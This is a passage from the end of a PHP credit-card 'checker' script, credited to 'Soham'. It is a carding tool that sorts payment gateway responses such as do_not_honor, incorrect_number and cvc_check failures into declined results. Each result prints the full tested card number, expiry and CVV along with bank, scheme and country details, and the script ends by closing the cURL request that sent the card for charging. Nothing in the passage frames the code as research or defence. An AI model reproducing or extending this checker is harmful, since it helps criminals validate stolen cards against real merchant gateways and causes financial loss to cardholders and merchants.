  echo "<b>❌ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "processing_error")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}
elseif
(strpos($result1,  'Invalid account.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Oops, the payment didn't go through ❌ SOHAM  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}
elseif
(strpos($result1, "service_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  '"cvc_check": "unchecked"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  '"cvc_check": "unavailable"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "parameter_invalid_empty")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "lock_timeout")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "transaction_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1, "three_d_secure_redirect")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1, "missing_payment_information")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  'Your card has expired.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  'card number is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> ";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ Currency</b> : $currency<br>";
  echo "<b>❌ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "incorrect_number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> ";
}


elseif
(strpos($result1,  'card was declined.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Soham ]  </i></font><br> ";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ Currency</b> : $currency<br>";
  echo "<b>❌ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "'Oops, the payment didn't go through.'")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Soham ]  </i></font><br> ";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ Currency</b> : $currency<br>";
  echo "<b>❌ Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "do_not_honor")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Soham ]  </i></font><br> ";
  
}


elseif
(strpos($result1,  "expired_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>❌ Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Soham ]  </i></font><br> ";
}

elseif
(strpos($result1,  "processing_error")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1, "service_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}


elseif
(strpos($result1,  "parameter_invalid_empty")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  "lock_timeout")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1, "missing_payment_information")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif
(strpos($result1, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Soham ]  </i></font><br> ";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif 
(strpos($result1,  'An error occurred while processing your card. Try again in a little bit.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'>Proxy Error [ Soham ] </i></font> <br> <font class='badge badge-primary'>Bank = [$bank] Type = [$type] Scheme = [$scheme1] Brand = [$brand] Country = [$country] Currency = [$currency]</i></font> <br>";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

elseif 
(strpos($result1,  'There has been a critical error on your website.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'>Error In Site [ Soham ] </i></font> <br> <font class='badge badge-primary'></i></font> <br>";
  echo "<b>Bank</b> : $bank<br>";
  echo "<b>Type</b> : $type<br>";
  echo "<b>Scheme</b> : $scheme1<br>";
  echo "<b>Brand</b> : $brand<br>";
  echo "<b>Currency</b> : $currency<br>";
  echo "<b>Country</b> :  $country1<br>";
}

else {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>❌ Proxy Error/Try Again [ Soham ]  </i></font><br> ";
  echo "<b>❌ Bank</b> : $bank<br>";
  echo "<b>❌ Type</b> : $type<br>";
  echo "<b>❌ Scheme</b> : $scheme1<br>";
  echo "<b>❌ Brand</b> : $brand<br>";
  echo "<b>❌ ❌ Currency</b> : $currency<br>";
  echo "<b>❌ Country</b> :  $country1<br>";
}

curl_close($ch);
ob_flush();

echo $result1;

//echo "<b> Firstname </b> :  $firstname<br>";
//echo "<b> Lastname </b> :  $lastname<br>";
//echo "<b> City </b> :  $city<br>";
//echo "<b> State </b> :  $state<br>";
//echo "<b> Country </b> :  $country1<br>";
//echo "<b> Email </b> :  $email<br>";
//echo "<b> Phone </b> :  $phone<br>";


?>